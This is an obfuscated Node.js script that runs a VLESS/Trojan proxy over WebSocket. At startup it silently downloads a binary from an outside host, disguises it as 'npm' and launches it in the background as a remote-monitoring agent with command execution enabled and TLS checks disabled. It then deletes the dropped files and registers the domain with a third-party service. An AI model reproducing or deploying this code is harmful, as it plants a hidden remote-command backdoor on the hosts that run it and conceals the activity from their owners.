const _0x527533=_0x5c66;(function(_0x1caa7d,_0x2c317d){const _0x1e7296=_0x5c66,_0x207e24=_0x1caa7d();while(!![]){try{const _0x372820=-parseInt(_0x1e7296(0x89))/0x1+parseInt(_0x1e7296(0xa5))/0x2*(-parseInt(_0x1e7296(0xa0))/0x3)+-parseInt(_0x1e7296(0x7f))/0x4*(-parseInt(_0x1e7296(0xd0))/0x5)+parseInt(_0x1e7296(0x70))/0x6+-parseInt(_0x1e7296(0x6f))/0x7+parseInt(_0x1e7296(0xb2))/0x8+parseInt(_0x1e7296(0xe5))/0x9;if(_0x372820===_0x2c317d)break;else _0x207e24['push'](_0x207e24['shift']());}catch(_0x514d2b){_0x207e24['push'](_0x207e24['shift']());}}}(_0x15e9,0x50eb8));const os=require('os'),http=require(_0x527533(0xe7)),fs=require('fs'),axios=require(_0x527533(0x87)),net=require(_0x527533(0x9e)),path=require(_0x527533(0xa7)),crypto=require(_0x527533(0x96)),{Buffer}=require(_0x527533(0x7e)),{exec,execSync}=require(_0x527533(0x6e)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x527533(0x83)]||_0x527533(0xc1),NEZHA_SERVER=process['env'][_0x527533(0xcb)]||'',NEZHA_PORT=process[_0x527533(0xd1)][_0x527533(0xb3)]||'',NEZHA_KEY=process[_0x527533(0xd1)][_0x527533(0x7a)]||'',DOMAIN=process[_0x527533(0xd1)]['DOMAIN']||_0x527533(0x94),AUTO_ACCESS=process['env'][_0x527533(0x93)]||!![],WSPATH=process[_0x527533(0xd1)][_0x527533(0x9c)]||UUID[_0x527533(0xd6)](0x0,0x8),SUB_PATH=process[_0x527533(0xd1)][_0x527533(0x9d)]||_0x527533(0xe3),NAME=process[_0x527533(0xd1)][_0x527533(0xd5)]||'',PORT=process[_0x527533(0xd1)][_0x527533(0xcd)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3ce494=_0x527533;try{const _0x18c509=await axios['get'](_0x3ce494(0x8f)),_0x40901f=_0x18c509[_0x3ce494(0xc2)];ISP=(_0x40901f[_0x3ce494(0xba)]+'-'+_0x40901f[_0x3ce494(0xb0)])[_0x3ce494(0xd9)](/ /g,'_');}catch(_0x7d3424){ISP=_0x3ce494(0x72);}};GetISP();function _0x5c66(_0x1cdf41,_0x3cf496){_0x1cdf41=_0x1cdf41-0x6e;const _0x15e9b2=_0x15e9();let _0x5c6635=_0x15e9b2[_0x1cdf41];return _0x5c6635;}const httpServer=http['createServer']((_0xb4cc5d,_0x12e897)=>{const _0x136da7=_0x527533;if(_0xb4cc5d[_0x136da7(0x8b)]==='/'){const _0x109d5e=path['join'](__dirname,_0x136da7(0xb6));fs['readFile'](_0x109d5e,_0x136da7(0x71),(_0x425696,_0x43704c)=>{const _0x3b6d5b=_0x136da7;if(_0x425696){_0x12e897[_0x3b6d5b(0x78)](0xc8,{'Content-Type':_0x3b6d5b(0xa3)}),_0x12e897[_0x3b6d5b(0x7b)](_0x3b6d5b(0xc0));return;}_0x12e897[_0x3b6d5b(0x78)](0xc8,{'Content-Type':'text/html'}),_0x12e897['end'](_0x43704c);});return;}else{if(_0xb4cc5d['url']==='/'+SUB_PATH){const _0x3dc5cc=NAME?NAME+'-'+ISP:ISP,_0x160d54='vless://'+UUID+'@'+DOMAIN+_0x136da7(0x8a)+DOMAIN+_0x136da7(0xab)+DOMAIN+_0x136da7(0xe1)+WSPATH+'#'+_0x3dc5cc,_0x119c2a=_0x136da7(0xac)+UUID+'@'+DOMAIN+_0x136da7(0xdf)+DOMAIN+_0x136da7(0xab)+DOMAIN+_0x136da7(0xe1)+WSPATH+'#'+_0x3dc5cc,_0x410361=_0x160d54+'\x0a'+_0x119c2a,_0x3a2c8b=Buffer['from'](_0x410361)[_0x136da7(0xbe)]('base64');_0x12e897[_0x136da7(0x78)](0xc8,{'Content-Type':_0x136da7(0x84)}),_0x12e897[_0x136da7(0x7b)](_0x3a2c8b+'\x0a');}else _0x12e897[_0x136da7(0x78)](0x194,{'Content-Type':'text/plain'}),_0x12e897[_0x136da7(0x7b)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x527533(0xd9)](/-/g,''),DNS_SERVERS=[_0x527533(0xd4),_0x527533(0x82)];function _0x15e9(){const _0x30e628=['Status','finish','Automatic\x20Access\x20Task\x20added\x20successfully','split','https://amd64.ssss.nyc.mn/agent','WSPATH','SUB_PATH','net','digest','7947zWiaaT','npm\x20is\x20already\x20running,\x20skip\x20running...','npm\x20running\x20error:','text/html','Answer','464iMBrFN','npm\x20is\x20running','path','type','443','post','&fp=chrome&type=ws&host=','trojan://','false','connection','write','isp','readUInt8','1356672HpnrIx','NEZHA_PORT','includes','update','index.html','hex','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','send','country_code','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm','pipe','toString','&type=A','Hello\x20world!','91fa850e-4c33-4d7b-bab4-cea3bc837bd3','data','log','writeFileSync','\x20-p\x20','close','once','unlink','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','connect','NEZHA_SERVER','setsid\x20nohup\x20./npm\x20-s\x20','PORT','arm','reduce','115RnZxuT','env','listen','config.yaml','8.8.4.4','NAME','slice','readUInt16BE','length','replace','message','get','https://oooo.serv00.net/add-url','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://arm64.ssss.nyc.mn/agent',':443?security=tls&sni=','concat','&path=%2F','then','sub','createHash','2401155NUCkAt','arm64','http','child_process','2430008wtDPFi','3161916GmmMKt','utf8','Unknown','catch','https://dns.google/resolve?name=','every','utf-8','true','writeHead','substr','NEZHA_KEY','end','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://','buffer','94408tJVcnm','npm\x20download\x20successfully','join','1.1.1.1','UUID','text/plain','error','pop','axios','https://amd64.ssss.nyc.mn/v1','213051KHpfsP',':443?encryption=none&security=tls&sni=','url','2096','aarch64','https://arm64.ssss.nyc.mn/v1','https://api.ip.sb/geoip','test','map','2083','AUTO_ACCESS','1234.abc.com','chmod\x20+x\x20npm','crypto'];_0x15e9=function(){return _0x30e628;};return _0x15e9();}function resolveHost(_0x328819){return new Promise((_0x200394,_0xda6e59)=>{const _0xf9ef9=_0x5c66;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xf9ef9(0x90)](_0x328819)){_0x200394(_0x328819);return;}let _0x5454c5=0x0;function _0x3f278e(){const _0x31e44b=_0xf9ef9;if(_0x5454c5>=DNS_SERVERS[_0x31e44b(0xd8)]){_0xda6e59(new Error('Failed\x20to\x20resolve\x20'+_0x328819+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x30039e=DNS_SERVERS[_0x5454c5];_0x5454c5++;const _0x1d23c8=_0x31e44b(0x74)+encodeURIComponent(_0x328819)+_0x31e44b(0xbf);axios[_0x31e44b(0xdb)](_0x1d23c8,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x31e44b(0xe2)](_0x56f4c4=>{const _0x34a6bf=_0x31e44b,_0x8ec296=_0x56f4c4[_0x34a6bf(0xc2)];if(_0x8ec296[_0x34a6bf(0x97)]===0x0&&_0x8ec296[_0x34a6bf(0xa4)]&&_0x8ec296[_0x34a6bf(0xa4)][_0x34a6bf(0xd8)]>0x0){const _0xe7c7a=_0x8ec296['Answer']['find'](_0x3d5e93=>_0x3d5e93[_0x34a6bf(0xa8)]===0x1);if(_0xe7c7a){_0x200394(_0xe7c7a[_0x34a6bf(0xc2)]);return;}}_0x3f278e();})['catch'](_0x4bc876=>{_0x3f278e();});}_0x3f278e();});}function handleVlessConnection(_0x47f9df,_0x544b3f){const _0x22f8db=_0x527533,[_0x4717fd]=_0x544b3f,_0x1f27fa=_0x544b3f[_0x22f8db(0xd6)](0x1,0x11);if(!_0x1f27fa[_0x22f8db(0x75)]((_0x3d44ec,_0x5bcdbb)=>_0x3d44ec==parseInt(uuid[_0x22f8db(0x79)](_0x5bcdbb*0x2,0x2),0x10)))return![];let _0x40561d=_0x544b3f['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x2913a4=_0x544b3f[_0x22f8db(0xd6)](_0x40561d,_0x40561d+=0x2)[_0x22f8db(0xd7)](0x0),_0xef206d=_0x544b3f[_0x22f8db(0xd6)](_0x40561d,_0x40561d+=0x1)[_0x22f8db(0xb1)](),_0x1f499c=_0xef206d==0x1?_0x544b3f[_0x22f8db(0xd6)](_0x40561d,_0x40561d+=0x4)[_0x22f8db(0x81)]('.'):_0xef206d==0x2?new TextDecoder()['decode'](_0x544b3f[_0x22f8db(0xd6)](_0x40561d+0x1,_0x40561d+=0x1+_0x544b3f['slice'](_0x40561d,_0x40561d+0x1)[_0x22f8db(0xb1)]())):_0xef206d==0x3?_0x544b3f['slice'](_0x40561d,_0x40561d+=0x10)[_0x22f8db(0xcf)]((_0x30e74b,_0x288ba7,_0x406930,_0x5a20b4)=>_0x406930%0x2?_0x30e74b['concat'](_0x5a20b4[_0x22f8db(0xd6)](_0x406930-0x1,_0x406930+0x1)):_0x30e74b,[])[_0x22f8db(0x91)](_0x186688=>_0x186688['readUInt16BE'](0x0)[_0x22f8db(0xbe)](0x10))[_0x22f8db(0x81)](':'):'';_0x47f9df[_0x22f8db(0xb9)](new Uint8Array([_0x4717fd,0x0]));const _0x42f804=createWebSocketStream(_0x47f9df);return resolveHost(_0x1f499c)['then'](_0x56b1d3=>{const _0x298f73=_0x22f8db;net['connect']({'host':_0x56b1d3,'port':_0x2913a4},function(){const _0x2f3334=_0x5c66;this[_0x2f3334(0xaf)](_0x544b3f[_0x2f3334(0xd6)](_0x40561d)),_0x42f804['on'](_0x2f3334(0x85),()=>{})['pipe'](this)['on']('error',()=>{})[_0x2f3334(0xbd)](_0x42f804);})['on'](_0x298f73(0x85),()=>{});})[_0x22f8db(0x73)](_0x1c81ce=>{const _0xe564a7=_0x22f8db;net[_0xe564a7(0xca)]({'host':_0x1f499c,'port':_0x2913a4},function(){const _0x4473a6=_0xe564a7;this['write'](_0x544b3f[_0x4473a6(0xd6)](_0x40561d)),_0x42f804['on'](_0x4473a6(0x85),()=>{})[_0x4473a6(0xbd)](this)['on'](_0x4473a6(0x85),()=>{})['pipe'](_0x42f804);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x2eb2af,_0xbf2439){const _0x2d42e4=_0x527533;try{if(_0xbf2439[_0x2d42e4(0xd8)]<0x3a)return![];const _0x53589a=_0xbf2439[_0x2d42e4(0xd6)](0x0,0x38)[_0x2d42e4(0xbe)](),_0x14b0a0=[UUID];let _0x533152=null;for(const _0x5f1b9c of _0x14b0a0){const _0xb4c0a=crypto[_0x2d42e4(0xe4)]('sha224')[_0x2d42e4(0xb5)](_0x5f1b9c)[_0x2d42e4(0x9f)](_0x2d42e4(0xb7));if(_0xb4c0a===_0x53589a){_0x533152=_0x5f1b9c;break;}}if(!_0x533152)return![];let _0x5d9e1a=0x38;_0xbf2439[_0x5d9e1a]===0xd&&_0xbf2439[_0x5d9e1a+0x1]===0xa&&(_0x5d9e1a+=0x2);const _0x405343=_0xbf2439[_0x5d9e1a];if(_0x405343!==0x1)return![];_0x5d9e1a+=0x1;const _0x23b39e=_0xbf2439[_0x5d9e1a];_0x5d9e1a+=0x1;let _0x27cd7d,_0x3449b8;if(_0x23b39e===0x1)_0x27cd7d=_0xbf2439[_0x2d42e4(0xd6)](_0x5d9e1a,_0x5d9e1a+0x4)['join']('.'),_0x5d9e1a+=0x4;else{if(_0x23b39e===0x3){const _0x2734e4=_0xbf2439[_0x5d9e1a];_0x5d9e1a+=0x1,_0x27cd7d=_0xbf2439[_0x2d42e4(0xd6)](_0x5d9e1a,_0x5d9e1a+_0x2734e4)['toString'](),_0x5d9e1a+=_0x2734e4;}else{if(_0x23b39e===0x4)_0x27cd7d=_0xbf2439[_0x2d42e4(0xd6)](_0x5d9e1a,_0x5d9e1a+0x10)['reduce']((_0x160e43,_0x377eea,_0x51e59b,_0x47616f)=>_0x51e59b%0x2?_0x160e43[_0x2d42e4(0xe0)](_0x47616f['slice'](_0x51e59b-0x1,_0x51e59b+0x1)):_0x160e43,[])[_0x2d42e4(0x91)](_0x3c680a=>_0x3c680a['readUInt16BE'](0x0)[_0x2d42e4(0xbe)](0x10))['join'](':'),_0x5d9e1a+=0x10;else return![];}}_0x3449b8=_0xbf2439['readUInt16BE'](_0x5d9e1a),_0x5d9e1a+=0x2;_0x5d9e1a<_0xbf2439[_0x2d42e4(0xd8)]&&_0xbf2439[_0x5d9e1a]===0xd&&_0xbf2439[_0x5d9e1a+0x1]===0xa&&(_0x5d9e1a+=0x2);const _0x4ce81a=createWebSocketStream(_0x2eb2af);return resolveHost(_0x27cd7d)[_0x2d42e4(0xe2)](_0x1608ad=>{const _0x43733d=_0x2d42e4;net[_0x43733d(0xca)]({'host':_0x1608ad,'port':_0x3449b8},function(){const _0x4059e9=_0x43733d;_0x5d9e1a<_0xbf2439['length']&&this[_0x4059e9(0xaf)](_0xbf2439[_0x4059e9(0xd6)](_0x5d9e1a)),_0x4ce81a['on']('error',()=>{})[_0x4059e9(0xbd)](this)['on']('error',()=>{})[_0x4059e9(0xbd)](_0x4ce81a);})['on'](_0x43733d(0x85),()=>{});})[_0x2d42e4(0x73)](_0x263c0d=>{const _0x49ff01=_0x2d42e4;net[_0x49ff01(0xca)]({'host':_0x27cd7d,'port':_0x3449b8},function(){const _0x565aaa=_0x49ff01;_0x5d9e1a<_0xbf2439[_0x565aaa(0xd8)]&&this[_0x565aaa(0xaf)](_0xbf2439[_0x565aaa(0xd6)](_0x5d9e1a)),_0x4ce81a['on']('error',()=>{})['pipe'](this)['on'](_0x565aaa(0x85),()=>{})[_0x565aaa(0xbd)](_0x4ce81a);})['on'](_0x49ff01(0x85),()=>{});}),!![];}catch(_0x568347){return![];}}wss['on'](_0x527533(0xae),(_0x44fa0b,_0x3ef09e)=>{const _0x5cd2e4=_0x527533,_0x18160b=_0x3ef09e[_0x5cd2e4(0x8b)]||'';_0x44fa0b[_0x5cd2e4(0xc7)](_0x5cd2e4(0xda),_0x406864=>{const _0x46135b=_0x5cd2e4;if(_0x406864[_0x46135b(0xd8)]>0x11&&_0x406864[0x0]===0x0){const _0x4ece2c=_0x406864['slice'](0x1,0x11),_0x5bf0a8=_0x4ece2c['every']((_0x35a4ba,_0x5aaed9)=>_0x35a4ba==parseInt(uuid[_0x46135b(0x79)](_0x5aaed9*0x2,0x2),0x10));if(_0x5bf0a8){!handleVlessConnection(_0x44fa0b,_0x406864)&&_0x44fa0b[_0x46135b(0xc6)]();return;}}!handleTrojanConnection(_0x44fa0b,_0x406864)&&_0x44fa0b[_0x46135b(0xc6)]();})['on'](_0x5cd2e4(0x85),()=>{});});const getDownloadUrl=()=>{const _0x5d681e=_0x527533,_0x36f5c2=os['arch']();return _0x36f5c2===_0x5d681e(0xce)||_0x36f5c2===_0x5d681e(0xe6)||_0x36f5c2===_0x5d681e(0x8d)?!NEZHA_PORT?_0x5d681e(0x8e):_0x5d681e(0xde):!NEZHA_PORT?_0x5d681e(0x88):_0x5d681e(0x9b);},downloadFile=async()=>{const _0x2b45aa=_0x527533;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x32f739=getDownloadUrl(),_0x5985ab=await axios({'method':_0x2b45aa(0xdb),'url':_0x32f739,'responseType':'stream'}),_0xdcc18d=fs['createWriteStream'](_0x2b45aa(0xbc));return _0x5985ab[_0x2b45aa(0xc2)]['pipe'](_0xdcc18d),new Promise((_0xe0045,_0x28f699)=>{const _0xe66833=_0x2b45aa;_0xdcc18d['on'](_0xe66833(0x98),()=>{const _0x23260a=_0xe66833;console['log'](_0x23260a(0x80)),exec(_0x23260a(0x95),_0x5df807=>{if(_0x5df807)_0x28f699(_0x5df807);_0xe0045();});}),_0xdcc18d['on'](_0xe66833(0x85),_0x28f699);});}catch(_0x2f7760){throw _0x2f7760;}},runnz=async()=>{const _0x4a1404=_0x527533;try{const _0x198dbe=execSync(_0x4a1404(0xb8),{'encoding':_0x4a1404(0x76)});if(_0x198dbe['trim']()!==''){console[_0x4a1404(0xc3)](_0x4a1404(0xa1));return;}}catch(_0x427122){}await downloadFile();let _0x126d6c='',_0x43f231=[_0x4a1404(0xa9),'8443',_0x4a1404(0x8c),'2087',_0x4a1404(0x92),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x17f52e=_0x43f231['includes'](NEZHA_PORT)?'--tls':'';_0x126d6c=_0x4a1404(0xcc)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4a1404(0xc5)+NEZHA_KEY+'\x20'+_0x17f52e+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2e354b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4a1404(0x9a)](':')[_0x4a1404(0x86)]():'',_0x3fde8a=_0x43f231[_0x4a1404(0xb4)](_0x2e354b)?_0x4a1404(0x77):_0x4a1404(0xad),_0x5e254b='client_secret:\x20'+NEZHA_KEY+_0x4a1404(0xdd)+NEZHA_SERVER+_0x4a1404(0xc9)+_0x3fde8a+_0x4a1404(0xbb)+UUID;fs[_0x4a1404(0xc4)]('config.yaml',_0x5e254b);}_0x126d6c=_0x4a1404(0x7c);}else{console[_0x4a1404(0xc3)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x126d6c,{'shell':'/bin/bash'},_0x7b244b=>{const _0x404d6e=_0x4a1404;if(_0x7b244b)console[_0x404d6e(0x85)](_0x404d6e(0xa2),_0x7b244b);else console['log'](_0x404d6e(0xa6));});}catch(_0x7cd465){console[_0x4a1404(0x85)]('error:\x20'+_0x7cd465);}};async function addAccessTask(){const _0x1bc370=_0x527533;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x11d8ff=_0x1bc370(0x7d)+DOMAIN;try{const _0x3d2229=await axios[_0x1bc370(0xaa)](_0x1bc370(0xdc),{'url':_0x11d8ff},{'headers':{'Content-Type':'application/json'}});console['log'](_0x1bc370(0x99));}catch(_0x1bbc29){}}const delFiles=()=>{const _0x2215af=_0x527533;fs[_0x2215af(0xc8)](_0x2215af(0xbc),()=>{}),fs['unlink'](_0x2215af(0xd3),()=>{});};httpServer[_0x527533(0xd2)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
